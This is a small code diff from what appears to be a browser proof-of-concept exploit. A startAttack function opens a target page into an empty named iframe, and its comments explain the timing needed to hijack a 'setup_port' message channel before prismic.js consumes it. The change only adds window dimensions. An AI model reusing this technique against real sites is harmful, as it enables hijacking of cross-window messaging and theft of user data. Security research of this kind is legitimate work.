@@ -63,7 +63,7 @@ function startAttack() {
   // Step 1: window.open targets the empty named iframe, triggers FIRST load
   // CRITICAL: iframe must have NO src= so prismic.js hasn't run yet.
   // If iframe was pre-loaded, setup_port would already be consumed before we can hijack.
-  var x = window.open(TARGET, "victim");
+  var x = window.open(TARGET, "victim", "width=800,height=600");
   if (!x) {
     log('Failed to get window reference.', 'error');
     return;
